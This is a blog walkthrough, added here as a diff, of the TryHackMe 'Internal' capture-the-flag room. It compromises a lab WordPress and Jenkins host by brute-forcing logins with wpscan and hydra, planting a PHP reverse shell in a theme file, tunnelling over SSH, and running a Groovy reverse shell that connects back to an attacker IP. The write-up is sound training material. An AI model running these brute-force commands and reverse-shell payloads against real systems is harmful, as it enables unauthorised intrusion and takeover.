@@ -1,0 +1,234 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Internal | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Internal" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Internal" />
+<meta property="og:description" content="THM - Internal" />
+<link rel="canonical" href="https://tudm99.github.io/internal.html" />
+<meta property="og:url" content="https://tudm99.github.io/internal.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Internal" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Internal","headline":"Internal","url":"https://tudm99.github.io/internal.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9d81aa5ec0fd3d378905a6f5c775505f2ede6d9d">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Internal</h1>
+      <h2 class="project-tagline">THM - Internal</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+
+<p>Nmap Scan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:21 EEST
+Nmap scan report for 10.10.61.56
+Host is up (0.070s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.14 seconds
+</code></pre></div></div>
+
+<p>Gobuster:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/blog
+/wordpress
+/javascript
+</code></pre></div></div>
+<p>WPscan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan --url http://10.10.61.56/blog/ --enumerate u
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+</code></pre></div></div>
+<p>This would be a good time to add “internal.thm” to your “/etc/hosts”.</p>
+
+<p>Now, while I look around on the pages for any clues (CTFs am i right?), I’ll start wpscan to bruteforce the wordpress login.</p>
+
+<p>While I was looking around, wpscan found something.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[!] Valid Combinations Found:
+ | Username: admin, Password: [REDACTED]
+</code></pre></div></div>
+<p>And we logged in!</p>
+
+<p>Now we’ll navigate to “Appearance/Theme Editor” and replace the “404.php” file contents with a php shell. I’ll use the one from PentestMonkey.</p>
+
+<p>The theme is Twenty Seventeen, so our shell will be located at</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+</code></pre></div></div>
+<p>Now we got our shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 9002            
+Listening on 0.0.0.0 9002
+Connection received on 10.10.61.56 39104
+Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:37:53 up 18 min,  0 users,  load average: 0.00, 0.05, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+</code></pre></div></div>
+
+<p>I recommend checking out “Full TTYs” from hacktricks -&gt; <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys">Right Here</a></p>
+
+<p>We cd into “/home”, and have a look around.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@internal:/$ cd /home
+cd /home
+www-data@internal:/home$ ls
+ls
+aubreanna
+www-data@internal:/home$ cd aubreanna
+cd aubreanna
+bash: cd: aubreanna: Permission denied
+www-data@internal:/home$
+</code></pre></div></div>
+<p>As you can see, we don’t have permission to look inside “aubreanna”</p>
+
+<p>We’ll also check “/opt” as it’s good practice.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@internal:/opt$ ls
+ls
+containerd  wp-save.txt
+www-data@internal:/opt$ cat wp-save.txt
+cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:[REDACTED]
+www-data@internal:/opt$
+</code></pre></div></div>
+<p>Cool, now we have aubreanna’s login info. The text file indicates wordpress access, but we already have that. So let’s try to ssh into the machine using those credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:~$ whoami
+aubreanna
+</code></pre></div></div>
+<p>We’ll read “user.txt”, submit it, and then move on.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:/home$ cd aubreanna/
+aubreanna@internal:~$ ls
+jenkins.txt  snap  user.txt
+aubreanna@internal:~$ cat user.txt
+[REDACTED]
+aubreanna@internal:~$ 
+
+</code></pre></div></div>
+<p>We’ve also found a “jenkins.txt” file, let’s see what’s inside.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+</code></pre></div></div>
+
+<p>Ok, we have an internal service running. Now we need to access it.</p>
+
+<p>A quick look on superuser.com, talks about forwarding / ssh tunneling. As we need to access an internal service from the outside.</p>
+
+<p>And so, we create an ssh tunnel:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -N -L 5555:172.17.0.2:8080 aubreanna@10.10.61.56
+</code></pre></div></div>
+<p>And if we navigate to localhost:5555, we got access to a jenkins webpage.</p>
+
+<p>Default credentials, or at least those that I know of, are not working, so I’ll capture the login request in burp, and then use hydra to try and bruteforce it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5555 http-post-form "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[5555][http-post-form] host: 127.0.0.1   login: [REDACTED]   password: [REDACTED]
+</code></pre></div></div>
+<p>Cool! Now we’ll login, and abuse the jenkins script console to get a reverse shell again.</p>
+
+<p>We’ll run this script in the “http://localhost:5555/script”:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String host="10.18.116.220";
+int port=5554;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 5554
+Listening on 0.0.0.0 5554
+Connection received on 10.10.61.56 56022
+python -c 'import pty; pty.spawn("/bin/bash")'
+jenkins@jenkins:/$ 
+</code></pre></div></div>
+<p>And we have another shell!</p>
+
+<p>Snooping around a bit, we find this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@jenkins:/$ cd /home
+cd /home
+jenkins@jenkins:/home$ ls
+ls
+jenkins@jenkins:/home$ cd /opt
+cd /opt
+jenkins@jenkins:/opt$ ls
+ls
+note.txt
+jenkins@jenkins:/opt$ cat note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:[REDACTED]
+jenkins@jenkins:/opt$ 
+</code></pre></div></div>
+<p>Looks like we have the root password. Let’s try to ssh using these credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
+root@internal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@internal:~#
+</code></pre></div></div>
+
+<p>All there’s left to do, is to read the “/root/root.txt” file, and you’re done!</p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/internal">Try it out yourself!</a></p>
+
+<script src="https://platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>
+<script type="IN/Share" data-url="https://www.linkedin.com"></script>
+
+<p><a href="./">back</a></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
